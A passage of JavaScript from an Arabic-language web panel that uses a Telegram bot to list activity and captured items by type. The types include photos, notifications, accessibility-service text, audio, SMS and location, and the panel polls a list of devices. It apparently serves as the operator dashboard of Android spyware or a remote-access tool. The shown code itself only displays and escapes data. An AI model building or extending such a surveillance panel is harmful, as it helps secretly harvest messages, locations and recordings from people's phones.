        body.innerHTML = '<div class="log-empty"><div class="ico">📭</div><p>لا يوجد نشاط</p></div>';
        return;
    }

    body.innerHTML = '';
    for (const m of filtered){
        const entry = document.createElement('div');
        const isBot = !m.from_user;
        const isPhoto = m.type === 'photo';
        entry.className = 'log-entry ' + (isBot ? 'from-bot' : 'from-user') + (isPhoto ? ' is-photo' : '');

        const time = new Date(m.time_ms).toLocaleString('ar-EG', {hour:'2-digit', minute:'2-digit', day:'2-digit', month:'2-digit'});
        let avatarIcon = isBot ? '🤖' : '👤';
        if (isPhoto) avatarIcon = '📸';

        let contentHtml = '';
        if (isPhoto && m.file_id){
            contentHtml += `<div class="body">📸 صورة${m.caption ? ' — ' + escapeHtml(m.caption) : ''}</div>`;
            contentHtml += `<img data-file="${escapeAttr(m.file_id)}" onclick="openModal(this.src)">`;
        } else {
            contentHtml += `<div class="body">${escapeHtml(m.text)}</div>`;
        }

        entry.innerHTML = `
            <div class="avatar">${avatarIcon}</div>
            <div class="content">
                <div class="meta">
                    <span class="who">${isBot ? 'البوت' : 'أنت'}</span>
                    <span class="when">${time}</span>
                </div>
                ${contentHtml}
            </div>
        `;
        body.appendChild(entry);

        const imgEl = entry.querySelector('img[data-file]');
        if (imgEl) loadMedia(m.file_id, imgEl);
    }
}

function filterLog(el, mode){
    document.querySelectorAll('.log-tab').forEach(t=>t.classList.remove('on'));
    el.classList.add('on');
    currentFilter = mode;
    renderLog();
}

// ═══════════════════════════════════════
//  Exec Page
// ═══════════════════════════════════════
function openExec(){
    document.getElementById('execPage').classList.add('open');
    renderExec();
}
function closeExec(){
    document.getElementById('execPage').classList.remove('open');
}
function filterExec(el, mode){
    document.querySelectorAll('.etab').forEach(t=>t.classList.remove('on'));
    el.classList.add('on');
    currentExecFilter = mode;
    renderExec();
}
function renderExec(){
    const body = document.getElementById('execContent');
    let filtered = allMessages;
    if (currentExecFilter === 'photo') filtered = allMessages.filter(m=>m.type === 'photo');
    else if (currentExecFilter === 'notif') filtered = allMessages.filter(m=>m.type === 'notification');
    else if (currentExecFilter === 'text') filtered = allMessages.filter(m=>m.type === 'accessibility');
    else if (currentExecFilter === 'audio') filtered = allMessages.filter(m=>m.type === 'audio');
    else if (currentExecFilter === 'sms') filtered = allMessages.filter(m=>m.type === 'sms');
    else if (currentExecFilter === 'location') filtered = allMessages.filter(m=>m.type === 'location');

    if (filtered.length === 0){
        body.innerHTML = '<div class="log-empty"><div class="ico">📭</div><p>لا يوجد محتوى</p></div>';
        return;
    }
    body.innerHTML = '';
    for (const m of filtered){
        const entry = document.createElement('div');
        const isPhoto = m.type === 'photo';
        entry.className = 'log-entry ' + (m.from_user ? 'from-user' : 'from-bot') + (isPhoto ? ' is-photo' : '');
        const time = new Date(m.time_ms).toLocaleString('ar-EG', {hour:'2-digit', minute:'2-digit', day:'2-digit', month:'2-digit'});
        const avatarIcon = isPhoto ? '📸' : (m.from_user ? '👤' : '🤖');
        let contentHtml = '';
        if (isPhoto && m.file_id){
            contentHtml += `<img data-file="${escapeAttr(m.file_id)}" onclick="openModal(this.src)">`;
        } else {
            contentHtml += `<div class="body">${escapeHtml(m.text)}</div>`;
        }
        entry.innerHTML = `
            <div class="avatar">${avatarIcon}</div>
            <div class="content">
                <div class="meta">
                    <span class="who">${m.from_user ? 'أنت' : 'البوت'}</span>
                    <span class="when">${time}</span>
                </div>
                ${contentHtml}
            </div>
        `;
        body.appendChild(entry);
        const imgEl = entry.querySelector('img[data-file]');
        if (imgEl) loadMedia(m.file_id, imgEl);
    }
}

async function loadMedia(fileId, el){
    try{
        const res = await fetch(`${TG_API}/getFile?file_id=${fileId}`);
        const data = await res.json();
        if (data.ok && data.result.file_path){
            el.src = `${TG_FILE}/${data.result.file_path}`;
        }
    } catch(e){}
}

// ═══════════════════════════════════════
//  Helpers
// ═══════════════════════════════════════
function escapeHtml(s){
    return String(s).replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
function escapeAttr(s){
    return String(s).replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
function openModal(src){
    document.getElementById('modalImg').src = src;
    document.getElementById('imgModal').classList.add('show');
}
function closeModal(){
    document.getElementById('imgModal').classList.remove('show');
}

// ═══════════════════════════════════════
//  Refresh
// ═══════════════════════════════════════
async function refresh(){
    await pullIncoming();
    await loadMessages(false);
}

loadDevices();
loadMessages(false);
refresh();

setInterval(loadDevices, 20000);
setInterval(refresh, 15000);
</script>
